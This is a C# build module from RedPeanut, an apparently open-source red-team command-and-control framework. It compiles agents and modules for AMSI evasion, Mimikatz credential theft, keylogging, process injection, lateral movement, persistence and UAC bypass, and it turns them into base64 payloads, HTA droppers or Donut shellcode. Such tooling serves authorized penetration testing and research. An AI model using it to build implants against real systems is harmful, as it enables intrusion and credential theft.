//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using donutCS;
using donutCS.Structs;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Text;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.IO;
using System.Linq;
using System.Text;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class Builder
    {
        private static string runtimePath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, DOTNET_40_REF_FOLDER, @"{0}.dll");
        private static string outputPath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER);
        private static string srcPath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER, SRC_FOLDER);
        private static string srcExternalPath = Path.Combine(Directory.GetCurrentDirectory(), EXTERNAL_FOLDER);

        static List<string> evasion = new List<string> { "Evasion.cs" };

        static List<string> generic = new List<string> { "CustomLoadLibrary.cs", "NativeSysCall.cs", "Natives.cs" };

        static List<string> support = new List<string> { "Crypto.cs", "Utility.cs", "ImageLoader.cs", "Spawner.cs", "InjectionHelper.cs", "InjectionLoaderListener.cs" };

        static List<string> agentDeps = new List<string> { "AgentInstanceNamedPipe.cs", "SmbListener.cs", "CommandExecuter.cs" };

        static List<string> credentials = new List<string>{
                "Mimikatz.cs",
                "Tokens.cs"
            };

        static List<string> enumeration = new List<string>{
                "Domain.cs",
                "GPO.cs",
                "Host.cs",
                "Keylogger.cs",
                "Network.cs",
                "Registry.cs"
            };

        static List<string> enumeration_host = new List<string>{
                "Host.cs",
                "Registry.cs"
            };

        static List<string> enumeration_domain = new List<string>{
                "Domain.cs",
            };


        static List<string> ssevasion = new List<string>{
                "Amsi.cs"
            };

        static List<string> execution = new List<string>{
                "Assembly.cs",
                "Native.cs",
                "PE.cs",
                "Shell.cs",
                "ShellCode.cs",
                "Win32.cs"
            };

        static List<string> execution_DynamicInvoke = new List<string>{
                "Generic.cs",
                "Native.cs",
                "Win32.cs"
            };

        static List<string> execution_Injection = new List<string>{
                "Allocation.cs",
                "Execution.cs",
                "Injector.cs",
                "Payload.cs"
            };

        static List<string> execution_ManualMap = new List<string>{
                "Map.cs",
                "Overload.cs"
            };

        static List<string> ssgeneric = new List<string>{
                "Generic.cs"
            };

        static List<string> lateralMovement = new List<string>{
                "DCOM.cs",
                "PowerShellRemoting.cs",
                "SCM.cs",
                "WMI.cs"
            };

        static List<string> misc = new List<string>{
                "CountdownEvent.cs",
                "Utilities.cs"
            };

        static List<string> persistence = new List<string>{
                "Autorun.cs",
                "Startup.cs",
                "WMI.cs",
                "Registry.cs",
                "COM.cs"
            };

        static List<string> pivoting = new List<string>{
                "ReversePortForwarding.cs"
            };

        static List<string> privilegeEscalation = new List<string>{
                "Exchange.cs"
            };

        static Dictionary<CompilationProfile, string[]> compilationProfiles = new Dictionary<CompilationProfile, string[]>
        {
            {CompilationProfile.Agent ,new List<string>().Concat(evasion).Concat(generic).Concat(support).Concat(agentDeps).ToArray() },
            {CompilationProfile.Generic, new List<string>().Concat(evasion).Concat(generic).ToArray()},
            {CompilationProfile.UACBypass, new List<string>().Concat(evasion).Concat(generic).Concat(support).Concat(credentials).Concat(execution).Concat(execution_DynamicInvoke).Concat(execution_ManualMap).Concat(misc).Concat(new List<string>{
                "UACBypassHelper.cs",
                "WnfHelper.cs",
                "Enums.cs",//
                "Imports.cs",
                "Loader.cs",
                "Structs.cs"
            }).ToArray() },
            {CompilationProfile.StandardCommand, new List<string>().Concat(ssgeneric).Concat(credentials).Concat(execution).Concat(enumeration_host).Concat(execution_ManualMap).Concat(misc).Concat(new List<string>{
                "Utility.cs",
                "Crypto.cs",
                "ImageLoader.cs"
            }).ToArray()},
            {CompilationProfile.SSploitEnumerationDomain, new List<string>().Concat(ssgeneric).Concat(execution).Concat(enumeration_domain).Concat(execution_ManualMap).Concat(misc).Concat(new List<string>{
                "Utility.cs",
                "Crypto.cs",
                "ImageLoader.cs"
            }).ToArray()},
            {CompilationProfile.PersistenceCLR,new string[]{}},
            {CompilationProfile.Migrate,new List<string>().Concat(evasion).Concat(generic).Concat(support).Concat(new List<string>{
                "WnfHelper.cs"
            }).ToArray()},
            {CompilationProfile.SSploitPersistence,persistence.ToArray()}
        };

        private static SyntaxTree Parse(string text, string filename = "", CSharpParseOptions options = null)
        {
            var stringText = SourceText.From(text, Encoding.UTF8);
            return SyntaxFactory.ParseSyntaxTree(stringText, options, filename);
        }

        private static IEnumerable<MetadataReference> GetReferences(int targhetframework)
        {
            string runtimePathRef = "";
            if (targhetframework == 40)
                runtimePathRef = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, DOTNET_40_REF_FOLDER, @"{0}.dll");
            else
                runtimePathRef = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, DOTNET_35_REF_FOLDER, @"{0}.dll");

            IEnumerable<MetadataReference> References = new[]
            {
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "mscorlib")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Core")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Web.Extensions")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Configuration.Install")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.XML")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.ServiceProcess")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Management.Automation")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Management")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.Drawing")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.DirectoryServices")),
                MetadataReference.CreateFromFile(string.Format(runtimePathRef, "System.IdentityModel"))
            };
            return References;
        }

        static CSharpCompilation CreateCompilation(string filesrcasstr, string destfilename, IEnumerable<MetadataReference> references, string type = "dll", CompilationProfile compprofile = CompilationProfile.Generic)
        {
            var source = filesrcasstr;
            string keyfilename = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, KEYFILE_FOLDER, "key.snk");
            List<SyntaxTree> compilationTrees = new List<SyntaxTree>();

            string[] sourceDirectorys = { srcPath, srcExternalPath };

            foreach (string s in sourceDirectorys)
            {
                List<SourceSyntaxTree> sourceSyntaxTrees = new List<SourceSyntaxTree>();
                sourceSyntaxTrees.AddRange(Directory.GetFiles(s, "*.cs", SearchOption.AllDirectories)
                              .Where(F => compilationProfiles.GetValueOrDefault(compprofile).Contains(F.Substring(F.LastIndexOf(Path.DirectorySeparatorChar) + 1)))
                              .Select(F => new SourceSyntaxTree { FileName = F, SyntaxTree = CSharpSyntaxTree.ParseText(File.ReadAllText(F), new CSharpParseOptions()) })
                              .ToList());

                compilationTrees.AddRange(sourceSyntaxTrees.Select(S => S.SyntaxTree).ToList());
            }

            SyntaxTree sourceTree = CSharpSyntaxTree.ParseText(source, new CSharpParseOptions());
            compilationTrees.Add(sourceTree);

            CSharpCompilationOptions options = null;
            if (type.Equals("exe"))
            {
                options = new CSharpCompilationOptions(outputKind: OutputKind.ConsoleApplication, optimizationLevel: OptimizationLevel.Release, platform: Platform.AnyCpu, allowUnsafe: true);
            }
            else
            {
                options = new CSharpCompilationOptions(outputKind: OutputKind.DynamicallyLinkedLibrary, optimizationLevel: OptimizationLevel.Release, platform: Platform.AnyCpu, allowUnsafe: true);
            }

            CSharpCompilation compilation = null;
            if (!string.IsNullOrEmpty(type))
            {
                compilation = CSharpCompilation.Create(destfilename, compilationTrees, references, options);
            }
            else
            {
                Console.WriteLine("[x] Build error");
            }

            return compilation;
        }

        private class SourceSyntaxTree
        {
            public string FileName { get; set; } = "";
            public SyntaxTree SyntaxTree { get; set; }
            public List<ITypeSymbol> UsedTypes { get; set; } = new List<ITypeSymbol>();
        }

        static void BuidAssembly(string filesrcasstr, string destfilename, int targetFramework, string type = "dll")
        {
            CSharpCompilation compilation = CreateCompilation(filesrcasstr, destfilename, GetReferences(targetFramework), type);
            try
            {
                var result = compilation.Emit(Path.Combine(outputPath, destfilename));

                if (result.Success)
                {
                    Console.WriteLine("[*] Bulid finished assembly {0} created", Path.Combine(outputPath, destfilename));
                }
                else
                {
                    Console.WriteLine("[X] Failed");
                    foreach (Diagnostic d in result.Diagnostics)
                        Console.WriteLine("[X] Debug info {0}", d.GetMessage());
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Build error {0}", e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static byte[] BuidStreamAssembly(string filesrcasstr, string destfilename, int targetFramework, string type = "dll", CompilationProfile compprofile = CompilationProfile.Generic)
        {

            CSharpCompilation compilation = CreateCompilation(filesrcasstr, destfilename, GetReferences(targetFramework), type, compprofile);
            try
            {
                MemoryStream s = new MemoryStream();

                var result = compilation.Emit(s);

                if (result.Success)
                {
                    //Console.WriteLine("[*] Bulid finished IL for assembly {0} created", destfilename);
                    return s.ToArray();
                }
                else
                {
                    Console.WriteLine("[X] Failed");
                    foreach (Diagnostic d in result.Diagnostics)
                        Console.WriteLine("[X] Debug info {0}", d.GetMessage());
                    return null;
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Build error {0}", e.Message);
                Console.WriteLine(e.StackTrace);
                return null;
            }
        }

        public static void GenerateExe(string filesrcasstr, string destfilename, int targetframework = 40)
        {
            //Console.WriteLine("Building following source");
            //Console.WriteLine(filesrcasstr);
            BuidAssembly(filesrcasstr, destfilename, targetframework, "exe");
        }

        public static string GenerateExeBase64(string filesrcasstr, string destfilename, int targetframework = 40)
        {
            return Convert.ToBase64String(BuidStreamAssembly(filesrcasstr, destfilename, targetframework, "exe"));
        }

        public static string GenerateDllBase64Hta(string filesrcasstr, string destfilename, int targetframework = 40)
        {
            BuidAssembly(filesrcasstr, destfilename, 40, "dll");
            string assemblyb64 = "";
            if (File.Exists(Path.Combine(outputPath, destfilename)))
                assemblyb64 = Convert.ToBase64String(File.ReadAllBytes(Path.Combine(outputPath, destfilename)));

            return assemblyb64;
            //return Convert.ToBase64String(BuidStreamAssembly(filesrcasstr, destfilename, "dll"));
        }

        public static string GenerateDllBase64(string filesrcasstr, string destfilename, int targetframework = 40)
        {
            return Convert.ToBase64String(BuidStreamAssembly(filesrcasstr, destfilename, targetframework, "dll"));
        }

        public static void GenerateDll(string filesrcasstr, string destfilename, int targetframework = 40)
        {
            BuidAssembly(filesrcasstr, destfilename, targetframework, "dll");
        }

        public static byte[] GenerateShellcode(string assemblyasstr, string destfilename, string classname, string methodname, string[] assemblyargs, int targetframework = 40)
        {
            string loaderstr = File.ReadAllText(Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER, "DonutLoader.cs"));
            loaderstr = Replacer.ReplaceDonutLoader(loaderstr, assemblyasstr, classname, methodname);
            GenerateExe(loaderstr, destfilename);

            string parsedagrs = string.Empty;

            foreach (string s in assemblyargs)
                parsedagrs += s + ",";

            parsedagrs = parsedagrs.TrimEnd(',');
            DSConfig config = new Helper().InitStruct("DSConfig");

            if (assemblyargs != null && assemblyargs.Length > 0)
            {
                config.file = Path.Combine(outputPath, destfilename).ToArray();
                config.method = "Main".ToArray();
                config.cls = "DonutLoader".ToArray();
                config.param = parsedagrs.ToArray();
                config.arch = 3;
            }
            else
            {
                config.file = Path.Combine(outputPath, destfilename).ToArray();
                config.method = "Main".ToArray();
                config.cls = "DonutLoader".ToArray();
                config.arch = 3;
            }

            byte[] outputbyte = Generator.Donut_Create(ref config);

            File.Delete(Path.Combine(outputPath, destfilename));

            return outputbyte;
        }
    }
}
